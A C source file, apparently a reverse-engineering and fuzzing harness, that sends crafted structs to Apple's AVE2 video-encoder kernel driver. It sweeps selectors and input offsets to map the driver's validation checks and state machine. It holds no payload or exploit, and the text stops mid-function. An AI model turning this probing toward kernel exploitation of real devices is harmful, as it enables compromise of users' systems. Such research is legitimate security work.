/*
 * ave2_probe_create.c v21 - enctype discrimination matrix
 *
 * v20: wake-port drain = MACH_RCV_TIMED_OUT (no messages). Dead end.
 * KEY RE-READ: translate table @0x24b148 maps AVE -1000 -> 0xbc !!
 * So device bc may be translate(AVE -1000) from the session machine,
 * NOT the kext gate constructor. And v15 P8 (enctype=1) was the ONLY
 * non-bc variant (c2 = translate(-1001)) -> enctype field is live.
 *
 * v21 matrix (fresh session per group, full out dump every call):
 *  S1 create m1: A2 enctype1/static/1920 | A4 enctype0 | A5 enctype2
 *  S2 create m1: A1 enctype1/ANON-mmap/1920 | A3 enctype1/anon/64656x8080
 *  S3 create m2: A2'
 *  S4 create m1 + sel3 async: A2''
 *  S5 no create: A2'''
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <mach/mach.h>
#include <mach/message.h>
#include <mach/mach_time.h>
#include <unistd.h>
#include <sys/mman.h>
#include <dlfcn.h>
#include "iokit_dyn.h"
#include "ave2_wire.h"

static const char *krname(kern_return_t k) {
    switch (k) {
    case 0:           return "KERN_SUCCESS";
    case 0xe00002c2u: return "c2(-1001?)";
    case 0xe00002c7u: return "c7";
    case 0xe00002bcu: return "bc(-1000?)";
    case 0xe00002d8u: return "d8(-1009)";
    case 0xe00002d9u: return "d9(-1011)";
    case 0xe0000001u: return "0xe0000001(-1015)";
    default:          return "";
    }
}

static void dump_out(const uint8_t *out, size_t osz, size_t n) {
    size_t m = osz < n ? osz : n;
    int allz = 1;
    for (size_t q = 0; q < osz; q++) if (out[q]) { allz = 0; break; }
    printf("    osz=%zu allzero=%d out:", osz, allz);
    for (size_t q = 0; q < m; q++) printf("%02x", out[q]);
    printf("\n");
}

static uint8_t  stat_in[0x1a0c0];
static uint8_t  anon_in[0x1a0c0];
static uint8_t  in[0x6f0];
static uint8_t  out[0x400];
static int g_opentype = 1;
static uint64_t counter = 0x0000700000004005ULL;
static void apply_patch(uint8_t *buf, const char *spec); /* fwd: used by create_session */
static io_service_t svc;

static kern_return_t create_session(int mode, io_connect_t *conn) {
    *conn = MACH_PORT_NULL;
    kern_return_t kr = p_IOServiceOpen(svc, mach_task_self(), g_opentype, conn);
    if (kr != 0) { printf("    open fail 0x%08x\n", kr); return kr; }
    memset(in, 0, AVE2_IOS_CREATE_IN_SIZE);
    *(uint64_t *)(in + 0x08) = 0x4142434445464748ULL;
    *(uint64_t *)(in + 0x10) = 0x3132333435363738ULL;
    memcpy(in + AVE2_IOS_CREATE_OFF_VERSION, "904.76.7", 8);
    *(uint64_t *)(in + AVE2_IOS_CREATE_OFF_LOGCNT) = ++counter;
    *(int32_t *)(in + AVE2_IOS_CREATE_OFF_LOGLVL) = 1;
    *(int32_t *)(in + AVE2_IOS_CREATE_OFF_LOGNUM) = 1;
    *(int32_t *)(in + AVE2_IOS_CREATE_OFF_MODE)   = mode;
    {
        const char *cp = getenv("AVE2_CPATCH");
        if (cp != NULL && cp[0]) apply_patch(in, cp);
    }
    if (getenv("AVE2_CMAGIC")) {
        /* v32: real-client create-in fields (media-toolbox report section2):
           +0x18=0x7088980A magic, +0x20=timestamp, +0x6E8=arg1 */
        *(uint32_t *)(in + 0x18) = 0x7088980AU;
        *(uint64_t *)(in + 0x20) = (uint64_t)mach_absolute_time();
        *(uint32_t *)(in + 0x6E8) = 1;
        printf("    [cmagic] +0x18=0x7088980A +0x20=ts +0x6e8=1\n");
    }
    size_t osz = AVE2_IOS_CREATE_OUT_SIZE;
    memset(out, 0, sizeof(out));
    kern_return_t k1 = p_IOConnectCallStructMethod(*conn, 1, in, AVE2_IOS_CREATE_IN_SIZE, out, &osz);
    printf("    create m%d -> 0x%08x\n", mode, k1);
    if (k1 == 0) { printf("    create out:"); for (int q=0;q<8;q++) printf(" %08x", *(uint32_t*)(out+4*q)); printf("\n"); }
    return k1;
}

static void destroy_close(io_connect_t c) {
    uint8_t din[0x28] = {0}; size_t o = 0x20; memset(out, 0, sizeof(out));
    kern_return_t kr = p_IOConnectCallStructMethod(c, 2, din, 0x28, out, &o);
    printf("    destroy -> 0x%08x\n", kr);
    p_IOServiceClose(c);
}

/* which: 0=static, 1=anon mmap */
static void fill_cfg(int which, int w, int h, int p6, int enctype, int slices, int p7) {
    uint8_t *buf = which == 0 ? stat_in : anon_in;
    memset(buf, 0, sizeof(stat_in));
    memcpy(buf + 0x00, "904.76.7", 8);
    memcpy(buf + 0x28, "904.76.7", 8);
    *(int32_t *)(buf + AVE2_OFF_WIDTH)     = w;
    *(int32_t *)(buf + AVE2_OFF_HEIGHT)    = h;
    *(int32_t *)(buf + AVE2_MODE5_OFF_P6)  = p6;
    *(int32_t *)(buf + AVE2_MODE5_OFF_P8)  = 10;
    *(int32_t *)(buf + AVE2_OFF_ENCTYPE)   = enctype;
    *(int32_t *)(buf + AVE2_OFF_SLICES)    = slices;
    *(int32_t *)(buf + AVE2_MODE5_OFF_P7)  = p7;
}


static void sel3_async(io_connect_t c, mach_port_t wake) {
    uint8_t din[0x40];
    memset(din, 0, sizeof(din));
    memcpy(din, "904.76.7", 8);
    iodyn_async_ref_t aref; memset(aref, 0, sizeof(aref));
    aref[0] = 0x1;
    memset(out, 0xAA, sizeof(out));
    size_t o = 0x20;
    kern_return_t kr = p_IOConnectCallAsyncStructMethod(c, 3, wake, aref, 8, din, 0x38, out, &o);
    printf("    sel3 async -> 0x%08x\n", kr);
}

/* ---- v24 generic field-patch infra (env-driven, no assumptions) ---- */

static void apply_patch_quiet(uint8_t *buf, const char *spec) {
    if (spec == NULL || !spec[0]) return;
    char tmp[4096]; snprintf(tmp, sizeof(tmp), "%s", spec);
    char *save = NULL;
    for (char *tok = strtok_r(tmp, ";,", &save); tok; tok = strtok_r(NULL, ";,", &save)) {
        char *colon = strchr(tok, ':'); if (!colon) continue;
        *colon = 0;
        unsigned long off = strtoul(tok, NULL, 0);
        uint32_t val = (uint32_t)strtoul(colon + 1, NULL, 0);
        if (off + 4 > 0x1a0a0) continue;
        *(uint32_t *)(buf + off) = val;
    }
}

/* AVE2_PATCH="0x3204:2;0x2f64:3" -> write u32 LE at each offset */
static void apply_patch(uint8_t *buf, const char *spec) {
    if (spec == NULL || !spec[0]) return;
    char tmp[4096];
    snprintf(tmp, sizeof(tmp), "%s", spec);
    char *save = NULL;
    for (char *tok = strtok_r(tmp, ";,", &save); tok; tok = strtok_r(NULL, ";,", &save)) {
        char *colon = strchr(tok, ':');
        if (!colon) { printf("    [patch] bad token %s\n", tok); continue; }
        *colon = 0;
        unsigned long off = strtoul(tok, NULL, 0);
        uint32_t val = (uint32_t)strtoul(colon + 1, NULL, 0);
        if (off + 4 > 0x1a0a0) { printf("    [patch] off %lx OOR\n", off); continue; }
        *(uint32_t *)(buf + off) = val;
        printf("    [patch] +0x%lx = 0x%08x\n", off, val);
    }
}

static void sel4_p(const char *tag, io_connect_t c, int which, size_t isz, const char *patch) {
    uint8_t *buf = which == 0 ? stat_in : anon_in;
    apply_patch(buf, patch);
    memset(out, 0xAA, sizeof(out));
    size_t o = 0x20;
    kern_return_t kr = p_IOConnectCallStructMethod(c, 4, buf, isz, out, &o);
    printf("    [%s] sel4 -> 0x%08x %s\n", tag, kr, krname(kr));
    dump_out(out, o, 0x20);
}


/* ---- v36 helpers ---- */
#ifndef MACH_RCV_MSG_V
#define MACH_RCV_MSG_V 0x02
#endif
#ifndef MACH_RCV_TIMEOUT_V
#define MACH_RCV_TIMEOUT_V 0x100
#endif
#ifndef MACH_RCV_SUCCESS
#define MACH_RCV_SUCCESS 0x00000000
#endif
#ifndef MACH_MSGS_RCV_TIMED_OUT
#define MACH_MSGS_RCV_TIMED_OUT 0x100
#endif

/* let async replies be delivered so the kext can record the notification port */
static void drain_wake(mach_port_t p, int ms) {
    static uint8_t mbuf[0x400];
    if (p == MACH_PORT_NULL) return;
    for (int i = 0; i < 8; i++) {
        mach_msg_header_t *hdr = (mach_msg_header_t *)mbuf;
        kern_return_t kr = mach_msg(hdr, MACH_RCV_MSG_V | MACH_RCV_TIMEOUT_V, 0,
                                    sizeof(mbuf), p, MACH_MSGS_RCV_TIMED_OUT,
                                    (mach_msg_timeout_t)ms);
        printf("    [drain %d] mach_msg -> 0x%08x msid=%d\n", i, kr, (int)hdr->msgh_id);
        if (kr != MACH_RCV_SUCCESS) break;
    }
}

/* shared state walk: sel5..sel10 after a successful configure */
static void state_walk(io_connect_t c) {
    { uint8_t d5[0x1a0b0]; memset(d5,0,sizeof(d5)); memcpy(d5,stat_in,0x1a0a0);
      { const char *ix = getenv("AVE2_S5_IDX28"); if (ix && atoi(ix)) *(uint32_t *)(d5 + 0x28) = 1; }  /* v38: keep "904.76.7" at in+0x28 (validator memcmp) */
      uint8_t o5[0x150]; size_t o5z = 0x150; memset(o5, 0xAA, sizeof(o5));
      kern_return_t k5 = p_IOConnectCallStructMethod(c, 5, d5, sizeof(d5), o5, &o5z);
      printf("    sel5 -> 0x%08x %s osz=%zu out0:", k5, krname(k5), o5z);
      for (size_t q = 0; q < 16 && q < o5z; q++) printf("%02x", o5[q]);
      printf("\n"); }
    { uint8_t d6[0x30]; memset(d6,0,sizeof(d6)); memcpy(d6,stat_in,0x30); { const char *ix = getenv("AVE2_S5_IDX28"); if (ix && atoi(ix)) *(uint32_t *)(d6+0x28)=1; }
      uint8_t o6[0x20]; size_t o6z = 0x20; memset(o6, 0xAA, sizeof(o6));
      kern_return_t k6 = p_IOConnectCallStructMethod(c, 6, d6, sizeof(d6), o6, &o6z);
      printf("    sel6 -> 0x%08x %s osz=%zu out0:", k6, krname(k6), o6z);
      for (size_t q = 0; q < 16 && q < o6z; q++) printf("%02x", o6[q]);
      printf("\n"); }
    for (int sel = 7; sel <= 10; sel++) {
        uint8_t d7[0x30]; memset(d7,0,sizeof(d7)); memcpy(d7,stat_in,0x30); { const char *ix = getenv("AVE2_S5_IDX28"); if (ix && atoi(ix)) *(uint32_t *)(d7+0x28)=1; }
        *(int32_t *)(d7 + 0x08) = 1;
        uint8_t o7[0x20]; size_t o7z = 0x20; memset(o7, 0xAA, sizeof(o7));
        kern_return_t k7 = p_IOConnectCallStructMethod(c, sel, d7, sizeof(d7), o7, &o7z);
        printf("    sel%d -> 0x%08x %s osz=%zu out0:", sel, k7, krname(k7), o7z);
        for (size_t q = 0; q < 16 && q < o7z; q++) printf("%02x", o7[q]);
        printf("\n"); }
}
int main(void) {
    setvbuf(stdout, NULL, _IONBF, 0);
    if (iodyn_init() != 0) { printf("[-] iodyn\n"); return 3; }
    void *m = p_IOServiceMatching("AppleAVE2Driver");
    svc = p_IOServiceGetMatchingService(IODYN_MAIN_PORT, m);
    if (!svc) { printf("[-] no service\n"); return 1; }
    const char *e = getenv("AVE2_LOGCNT");
    if (e != NULL && e[0]) counter = strtoull(e, NULL, 0);
    g_opentype = getenv("AVE2_OPENTYPE") ? atoi(getenv("AVE2_OPENTYPE")) : 1;
    void *anon = mmap(NULL, sizeof(anon_in), PROT_READ | PROT_WRITE,
                      MAP_ANON | MAP_PRIVATE, -1, 0);
    if (anon == MAP_FAILED) { printf("[-] mmap\n"); return 4; }
    memset(anon, 0, sizeof(anon_in));
    mach_port_t wake = MACH_PORT_NULL;
    mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &wake);
    io_connect_t c;
    kern_return_t kr;

    const char *test = getenv("AVE2_TEST");
    printf("[mode] %s\n", test != NULL ? test : "battery");
    if (test != NULL && strcmp(test, "generic") == 0) {
        /* generic single/multi config crawler */
        int mode   = getenv("AVE2_CREATE_MODE") ? atoi(getenv("AVE2_CREATE_MODE")) : 1;
        int no_create = getenv("AVE2_NO_CREATE") ? atoi(getenv("AVE2_NO_CREATE")) : 0;
        int use_sel3  = getenv("AVE2_SEL3") ? atoi(getenv("AVE2_SEL3")) : 0;
        int w      = getenv("AVE2_W")  ? atoi(getenv("AVE2_W"))  : 1920;
        int h      = getenv("AVE2_H")  ? atoi(getenv("AVE2_H"))  : 1080;
        int p6     = getenv("AVE2_P6") ? atoi(getenv("AVE2_P6")) : 2;
        int p8     = getenv("AVE2_P8") ? atoi(getenv("AVE2_P8")) : 10;
        int slices = getenv("AVE2_SLICES") ? atoi(getenv("AVE2_SLICES")) : 0;
        int p7     = getenv("AVE2_P7") ? atoi(getenv("AVE2_P7")) : 0;
        int enc    = getenv("AVE2_ENC") ? atoi(getenv("AVE2_ENC")) : 1;
        int which  = getenv("AVE2_ANON") ? atoi(getenv("AVE2_ANON")) : 0;
        size_t isz = getenv("AVE2_SELSZ") ? (size_t)strtoul(getenv("AVE2_SELSZ"), NULL, 0) : 0x1a0a0;
        int repeat = getenv("AVE2_REPEAT") ? atoi(getenv("AVE2_REPEAT")) : 1;
        const char *patch = getenv("AVE2_PATCH");
        printf("=== generic w=%d h=%d p6=%d p8=%d sl=%d p7=%d enc=%d isz=0x%zx rep=%d ===\n",
               w, h, p6, p8, slices, p7, enc, isz, repeat);
        for (int i = 0; i < repeat; i++) {
            printf("--- rep %d ---\n", i);
            if (no_create) {
                if (p_IOServiceOpen(svc, mach_task_self(), g_opentype, &c) != 0) { printf("[-] open\n"); break; }
            } else {
                if (create_session(mode, &c) != 0) break;
            }
            if (use_sel3) sel3_async(c, wake);
            fill_cfg(which, w, h, p6, enc, slices, p7);
            char tag[64];
            snprintf(tag, sizeof(tag), "g%d", i);
            sel4_p(tag, c, which, isz, patch);
            if (!no_create) destroy_close(c);
            else p_IOServiceClose(c);
        }
    } else if (test != NULL && strcmp(test, "modesweep") == 0) {
        /* v25: create mode matrix 1..5 x enc 1/2, sel4 probe after each successful create */
        const char *patch = getenv("AVE2_MS_PATCH");
        printf("=== modesweep create m1..5 x enc1/2, sel4 after each success ===\n");
        for (int m = 1; m <= 5; m++) {
            for (int e = 1; e <= 2; e++) {
                printf("--- mode %d enc %d ---\n", m, e);
                if (create_session(m, &c) != 0) continue;
                fill_cfg(0, 1920, 1080, 2, e, 0, 0);
                sel4_p("ms", c, 0, 0x1a0a0, patch);
                destroy_close(c);
            }
        }
    } else if (test != NULL && strcmp(test, "lrbscan") == 0) {
        /* v26: locate LRB param block {flags@o,B@o+8,C@o+c,D@o+10,E@o+14} inside create input window 0x28..0x228.
           WorkPool OpenTask reads task+0x2c block; cmd payload comes from the 0x200 memcpy'd region. */
        const char *patch = getenv("AVE2_MS_PATCH");
        printf("=== lrbscan: probe LRB block origin in create input ===\n");
        for (int o = 0x28; o + 0x18 <= 0x228; o += 4) {
            if (create_session(1, &c) != 0) { printf("[-] create fail at o=0x%x\n", o); break; }
            fill_cfg(0, 1920, 1080, 2, 1, 0, 0);
            *(uint32_t *)(stat_in + o)        = 1;         /* flags -> s=2 */
            *(uint32_t *)(stat_in + o + 0x8)  = 0x10000;   /* B */
            *(uint32_t *)(stat_in + o + 0xc)  = 0x10000;   /* C */
            *(uint32_t *)(stat_in + o + 0x10) = 4;         /* D */
            *(uint32_t *)(stat_in + o + 0x14) = 4;         /* E */
            sel4_p("lb", c, 0, 0x1a0a0, patch);
            destroy_close(c);
        }
        printf("=== lrbscan done ===\n");
    } else if (test != NULL && strcmp(test, "statesweep") == 0) {
        /* v27: after configure success, walk sel5/6/7/8/9/10 to map the encoder state machine */
        const char *patch = getenv("AVE2_MS_PATCH");
        int m = getenv("AVE2_CREATE_MODE") ? atoi(getenv("AVE2_CREATE_MODE")) : 1;
        printf("=== statesweep mode %d: create->sel4->sel5/6/7/8/9/10 ===\n", m);
        if (create_session(m, &c) != 0) { printf("[-] create\n"); return 42; }
        fill_cfg(0, 1920, 1080, 2, 1, 0, 0);
        sel4_p("st", c, 0, 0x1a0a0, patch);
        state_walk(c);
        destroy_close(c);
    } else if (test != NULL && strcmp(test, "s3sweep") == 0) {
        /* v36: sel5 -1011 (wrong state) means [UC+0x100] == NULL.
           The only non-zero writer of [UC+0x100] in the whole kext is 0x1b9c71c,
           reached from the sel3 (IO_Config) async path => issue sel3 async BEFORE configure. */
        const char *patch = getenv("AVE2_MS_PATCH");
        int m = getenv("AVE2_CREATE_MODE") ? atoi(getenv("AVE2_CREATE_MODE")) : 1;
        int s3v = getenv("AVE2_S3_VARIANT") ? atoi(getenv("AVE2_S3_VARIANT")) : 0;
        int dms = getenv("AVE2_DRAIN_MS") ? atoi(getenv("AVE2_DRAIN_MS")) : 800;
        printf("=== s3sweep mode %d s3var %d drain %dms: create->sel3(async)->sel4->sel5..10 ===\n", m, s3v, dms);
        if (create_session(m, &c) != 0) { printf("[-] create\n"); return 42; }
        {
            uint8_t din[0x40]; memset(din,0,sizeof(din));
            memcpy(din, "904.76.7", 8);
            iodyn_async_ref_t aref; memset(aref,0,sizeof(aref));
            switch (s3v) {
            case 0: aref[0] = 1; break;
            case 1: aref[0] = 1; aref[1] = 1; break;
            case 2: for (int q = 0; q < 8; q++) aref[q] = *(uint64_t *)(out + q * 8); break;
            case 3: aref[0] = (uint64_t)mach_task_self(); break;
            default: aref[0] = 1; break;
            }
            memset(out, 0xAA, sizeof(out));
            size_t o = 0x20;
            kern_return_t kr = p_IOConnectCallAsyncStructMethod(c, 3, wake, aref, 8, din, 0x38, out, &o);
            printf("    sel3 async(v%d) -> 0x%08x %s osz=%zu out0:", s3v, kr, krname(kr), o);
            for (size_t q = 0; q < 16 && q < o; q++) printf("%02x", out[q]);
            printf("\n");
        }
        drain_wake(wake, dms);
        fill_cfg(0, 1920, 1080, 2, 1, 0, 0);
        sel4_p("st", c, 0, 0x1a0a0, patch);
        state_walk(c);
        destroy_close(c);
    } else if (test != NULL && strcmp(test, "s5scan") == 0) {
        /* v37: sel5 input single-offset scan WITH sel3 async in front.
           Baseline (clean configure patch) => sel5 = 0xe0000001 (-1015).
           Any offset whose value change moves sel5 is a hit. */
        const char *patch = getenv("AVE2_MS_PATCH");
        int lo  = getenv("AVE2_SCAN_LO") ? (int)strtoul(getenv("AVE2_SCAN_LO"),0,0) : 0x28;
        int hi  = getenv("AVE2_SCAN_HI") ? (int)strtoul(getenv("AVE2_SCAN_HI"),0,0) : 0x400;
        uint32_t pv = getenv("AVE2_SCAN_VAL") ? (uint32_t)strtoul(getenv("AVE2_SCAN_VAL"),0,0) : 1;
        int hits = 0;
        printf("=== s5scan lo=0x%x hi=0x%x val=0x%x (sel5 baseline 0xe0000001) ===\n", lo, hi, pv);
        for (int o = lo; o + 4 <= hi; o += 4) {
            if (create_session(1, &c) != 0) { printf("[-] create at o=0x%x\n", o); break; }
            sel3_async(c, wake);
            fill_cfg(0, 1920, 1080, 2, 1, 0, 0);
            { uint8_t d4[0x1a0a0]; memset(d4,0,sizeof(d4)); memcpy(d4,stat_in,0x1a0a0);
              if (patch) apply_patch_quiet(d4, patch);
              uint8_t o4[0x20]; size_t o4z = 0x20; memset(o4, 0xAA, sizeof(o4));
              kern_return_t k4 = p_IOConnectCallStructMethod(c, 4, d4, sizeof(d4), o4, &o4z);
              uint8_t d5[0x1a0b0]; memset(d5,0,sizeof(d5)); memcpy(d5,stat_in,0x1a0a0);
              *(uint32_t *)(d5 + 0x28) = 1;
              *(uint32_t *)(d5 + o) = pv;
              uint8_t o5[0x150]; size_t o5z = 0x150; memset(o5, 0xAA, sizeof(o5));
              kern_return_t k5 = p_IOConnectCallStructMethod(c, 5, d5, sizeof(d5), o5, &o5z);
              if (k5 != 0xe0000001u) {
                printf("[HIT] o=0x%x sel4=0x%08x sel5=0x%08x %s out0:%02x%02x%02x%02x\n",
                       o, k4, k5, krname(k5), o5[0], o5[1], o5[2], o5[3]);
                hits++;
              } }
            destroy_close(c);
        }
        printf("=== s5scan done hits=%d ===\n", hits);
    } else if (test != NULL && strcmp(test, "s5var") == 0) {
        /* v37: try several sel5 input shapes, one fresh session each */
        const char *patch = getenv("AVE2_MS_PATCH");
        int hits = 0;
        for (int shape = 0; shape < 8; shape++) {
            printf("--- s5var shape %d ---\n", shape);
            if (create_session(1, &c) != 0) { printf("[-] create\n"); break; }
            sel3_async(c, wake);
            fill_cfg(0, 1920, 1080, 2, 1, 0, 0);
            { uint8_t d4[0x1a0a0]; memset(d4,0,sizeof(d4)); memcpy(d4,stat_in,0x1a0a0);
              if (patch) apply_patch_quiet(d4, patch);
              uint8_t o4[0x20]; size_t o4z = 0x20; memset(o4, 0xAA, sizeof(o4));
              kern_return_t k4 = p_IOConnectCallStructMethod(c, 4, d4, sizeof(d4), o4, &o4z);
              uint8_t d5[0x1a0b0]; memset(d5,0,sizeof(d5));
              switch (shape) {
              case 0: memcpy(d5,stat_in,0x1a0a0); *(uint32_t *)(d5 + 0x28) = 1; break;
              case 1: memcpy(d5,"904.76.7",8); memcpy(d5+0x28,"904.76.7",8); *(uint32_t *)(d5 + 0x28) = 1; break;
              case 2: memcpy(d5,stat_in,0x1a0a0); *(uint32_t *)(d5 + 0x28) = 1; *(int64_t *)(d5+0x10)=1; *(int64_t *)(d5+0x18)=1; *(int64_t *)(d5+0x20)=1; break;
              case 3: memcpy(d5,stat_in,0x1a0a0); *(uint32_t *)(d5 + 0x28) = 1; *(uint32_t *)(d5 + 0x1a0a8) = 1; break;
              case 4: memcpy(d5,stat_in,0x1a0a0); *(uint32_t *)(d5 + 0x28) = 1; *(uint32_t *)(d5 + 0xd90) = 1920; *(uint32_t *)(d5 + 0xd94) = 1080; break;
              case 5: memcpy(d5,stat_in,0x1a0a0); *(uint32_t *)(d5 + 0x28) = 1; *(int32_t *)(d5 + 0x2ffc) = 1; *(int32_t *)(d5 + 0x3130) = 2; *(int32_t *)(d5 + 0x312c) = 2; break;
              case 6: memcpy(d5,stat_in,0x1a0a0); *(uint32_t *)(d5 + 0x28) = 1; *(uint32_t *)(d5 + 0x228) = 0x40; *(uint32_t *)(d5 + 0x248) = 0x40; *(uint32_t *)(d5 + 0x268) = 0x40; break;
              default: memcpy(d5,stat_in,0x1a0a0); *(uint32_t *)(d5 + 0x28) = 1; *(uint32_t *)(d5 + 0x1a0a4) = 1; break;
              }
              uint8_t o5[0x150]; size_t o5z = 0x150; memset(o5, 0xAA, sizeof(o5));
              kern_return_t k5 = p_IOConnectCallStructMethod(c, 5, d5, sizeof(d5), o5, &o5z);
              printf("    shape %d sel4=0x%08x sel5=0x%08x %s out0:%02x%02x%02x%02x\n", shape, k4, k5, krname(k5), o5[0], o5[1], o5[2], o5[3]);
              if (k5 != 0xe0000001u) hits++;
            }
            destroy_close(c);
        }
        printf("=== s5var done moved=%d ===\n", hits);
    } else if (test != NULL && strcmp(test, "s2reg") == 0) {
        /* v31: real-client sequence = create -> sel2(session register) -> sel4 -> sel5.
           media-toolbox report section4: sel2 in 0x28: +0x00 cookie(this[0]), +0x08/+0x10=0,
           +0x18=0x7088980A magic, +0x20=timestamp; out 0x20 overlaps in+0x10. */
        const char *patch = getenv("AVE2_MS_PATCH");
        printf("=== s2reg: create -> sel2(register) -> sel4 -> sel5 ===\n");
        static const char *ckname[] = {"out0", "out1", "zero", "magic"};
        for (int ck = 0; ck < 4; ck++) {
            printf("--- s2reg cookie=%d (%s) ---\n", ck, ckname[ck]);
            if (create_session(1, &c) != 0) { printf("[-] create\n"); break; }
            printf("    [create out] ");
            for (size_t q = 0; q < 0x28; q++) printf("%02x", out[q]);
            printf("\n");
            uint64_t cookie;
            switch (ck) {
            case 0: cookie = *(uint64_t *)(out + 0x00); break;
            case 1: cookie = *(uint64_t *)(out + 0x08); break;
            case 2: cookie = 0; break;
            default: cookie = 0x7088980AULL; break;
            }
            uint8_t io2[0x30]; memset(io2, 0, sizeof(io2));
            *(uint64_t *)(io2 + 0x00) = cookie;
            *(uint64_t *)(io2 + 0x18) = 0x7088980AULL;
            *(uint64_t *)(io2 + 0x20) = (uint64_t)mach_absolute_time();
            size_t in2z = 0x28, o2z = 0x20;
            kern_return_t k2 = p_IOConnectCallStructMethod(c, 2, io2, in2z, io2 + 0x10, &o2z);
            printf("    [sel2] -> 0x%08x buf(+0x10):", k2);
            for (size_t q = 0; q < 0x20; q++) printf("%02x", io2[0x10 + q]);
            printf("\n");
            fill_cfg(0, 1920, 1080, 2, 1, 0, 0);
            sel4_p("s2pre", c, 0, 0x1a0a0, patch);
            uint8_t d5[0x1a0b0]; memset(d5, 0, sizeof(d5)); memcpy(d5, stat_in, 0x1a0a0);
            *(uint32_t *)(d5 + 0x28) = 1;
            uint8_t o5[0x150]; size_t o5z = 0x150; memset(o5, 0xAA, sizeof(o5));
            kern_return_t k5 = p_IOConnectCallStructMethod(c, 5, d5, sizeof(d5), o5, &o5z);
            printf("    [s5] sel5 -> 0x%08x osz=%zu out0:", k5, o5z);
            for (size_t q = 0; q < 16 && q < o5z; q++) printf("%02x", o5[q]);
            printf("\n");
            destroy_close(c);
        }
        printf("=== s2reg done ===\n");
    } else if (test != NULL && strcmp(test, "cfgscan") == 0) {
        /* v33: locate LRB param block {flags,B,C,D,E} inside CONFIGURE input.
           Patch a 5-field window at offset o, then sel4 -> sel5.
           Hit = sel5 error changes from -1015. */
        const char *patch = getenv("AVE2_MS_PATCH");
        printf("=== cfgscan: LRB window sweep over configure input ===\n");
        int lo = getenv("AVE2_SCAN_LO") ? (int)strtoul(getenv("AVE2_SCAN_LO"),0,0) : 0x28;
        int hi = getenv("AVE2_SCAN_HI") ? (int)strtoul(getenv("AVE2_SCAN_HI"),0,0) : 0x1a0a0;
        int hits = 0;
        for (int o = lo; o + 0x18 <= hi && hits < 40; o += 4) {
            if (create_session(1, &c) != 0) { printf("[-] create at o=0x%x\n", o); break; }
            fill_cfg(0, 1920, 1080, 2, 1, 0, 0);
            uint8_t d4[0x1a0a0]; memset(d4,0,sizeof(d4)); memcpy(d4,stat_in,0x1a0a0);
            const char *mp = patch; if (mp) apply_patch_quiet(d4, mp);
            { /* v34: AVE2_SCAN_SINGLE -> patch single u32 at o (value AVE2_SCAN_VAL, default 1) */
              const char *sm = getenv("AVE2_SCAN_SINGLE");
              const char *sv = getenv("AVE2_SCAN_VAL");
              uint32_t pv = sv ? (uint32_t)strtoul(sv,0,0) : 1;
              if (sm) { *(uint32_t *)(d4 + o) = pv; }
              else {
                *(uint32_t *)(d4 + o)        = 1;         /* flags -> s=2 */
                *(uint32_t *)(d4 + o + 0x8)  = 0x10000;   /* B */
                *(uint32_t *)(d4 + o + 0xc)  = 0x10000;   /* C */
                *(uint32_t *)(d4 + o + 0x10) = 4;         /* D */
                *(uint32_t *)(d4 + o + 0x14) = 4;         /* E */
              }
            }
            uint8_t o4[0x20]; size_t o4z = 0x20; memset(o4, 0xAA, sizeof(o4));
            kern_return_t k4 = p_IOConnectCallStructMethod(c, 4, d4, sizeof(d4), o4, &o4z);
            uint8_t d5[0x1a0b0]; memset(d5,0,sizeof(d5)); memcpy(d5,stat_in,0x1a0a0);
            *(uint32_t *)(d5 + 0x28) = 1;
            uint8_t o5[0x150]; size_t o5z = 0x150; memset(o5, 0xAA, sizeof(o5));
            kern_return_t k5 = p_IOConnectCallStructMethod(c, 5, d5, sizeof(d5), o5, &o5z);
            if (getenv("AVE2_LADDER")) {
                if (k4 == 0 && k5 != 0xe00002d9u && k5 != 0xe0000001u) {
                    printf("[LADDER] o=0x%x sel4=0x%08x sel5=0x%08x\n", o, k4, k5);
                    hits++;
                }
            } else if (k4 != 0 || (k5 != 0xe0000001u && k5 != 0xe00002d9u)) {
                printf("[HIT] o=0x%x sel4=0x%08x sel5=0x%08x\n", o, k4, k5);
                hits++;
                if (getenv("AVE2_SCAN_ALL")) continue;
            }
            destroy_close(c);
        }
        printf("=== cfgscan done hits=%d ===\n", hits);
    } else if (test != NULL && strcmp(test, "start5") == 0) {
        /* v28: sel5 UCStart matrix. kext verifier 0x1b98f14 requires:
           0x1b98084 s64 nonneg (in+0x10/+0x18/+0x20), [in+0x28] u32 != 0,
           [in+0x1A0A8] u32 nonneg. Then Configure(state==1) deep chain runs. */
        const char *patch = getenv("AVE2_MS_PATCH");
        int m = getenv("AVE2_CREATE_MODE") ? atoi(getenv("AVE2_CREATE_MODE")) : 1;
        printf("=== start5: create m%d -> sel4 -> sel5 matrix ===\n", m);
        for (int casei = 0; casei < 8; casei++) {
            printf("--- s5 case %d ---\n", casei);
            if (create_session(m, &c) != 0) { printf("[-] create\n"); break; }
            fill_cfg(0, 1920, 1080, 2, 1, 0, 0);
            sel4_p("s5pre", c, 0, 0x1a0a0, patch);
            { /* v29: dump full sel4 out (0x20) — checker return @+0x18 may be a token for sel5 */
              uint8_t d4[0x1a0a0]; memset(d4,0,sizeof(d4)); memcpy(d4,stat_in,0x1a0a0);
              const char *mp2 = patch; if (mp2) apply_patch(d4, mp2);
              uint8_t o4[0x20]; size_t o4z=0x20; memset(o4,0xAA,sizeof(o4));
              kern_return_t k4 = p_IOConnectCallStructMethod(c, 4, d4, sizeof(d4), o4, &o4z);
              printf("    [s5pre-full] sel4 -> 0x%08x out:", k4);
              for (size_t q = 0; q < 0x20; q++) printf("%02x", o4[q]);
              printf("\n"); }
            uint8_t d5[0x1a0b0]; memset(d5, 0, sizeof(d5));
            memcpy(d5, stat_in, 0x1a0a0);
            switch (casei) {
            case 0: *(uint32_t *)(d5 + 0x28) = 1; *(uint32_t *)(d5 + 0x1a0a8) = 0; break;
            case 1: *(uint32_t *)(d5 + 0x28) = 0; break; /* expect early reject */
            case 2: *(uint32_t *)(d5 + 0x28) = 1; *(uint32_t *)(d5 + 0x1a0a8) = 1; break;
            case 3: *(uint32_t *)(d5 + 0x28) = 0x40; break;
            case 4: *(uint32_t *)(d5 + 0x28) = 1; *(uint32_t *)(d5 + 0x1a0a8) = 0;
                    *(int32_t *)(d5 + 0x1a0a0) = 1; break;
            case 5: *(uint32_t *)(d5 + 0x28) = 1; *(uint32_t *)(d5 + 0x1a0a8) = 0;
                    *(int32_t *)(d5 + 0x1a0a4) = 1; break;
